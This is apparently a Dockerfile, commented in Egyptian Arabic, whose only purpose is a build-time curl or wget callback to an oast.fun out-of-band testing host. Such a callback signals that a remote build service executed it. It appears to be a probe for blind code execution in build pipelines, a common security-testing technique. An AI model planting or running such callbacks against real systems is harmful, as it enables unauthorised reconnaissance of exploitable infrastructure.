FROM alpine:latest
# محاولة تسطيب curl لو مش موجود (مع تجاهل الأخطاء)
RUN apk add --no-cache curl || true
# تنفيذ الاتصال
RUN curl http://docker.d526s3o3t4gglckn7dd07zq887iocppah.oast.fun || wget -qO- http://docker-wget.d526s3o3t4gglckn7dd07zq887iocppah.oast.fun
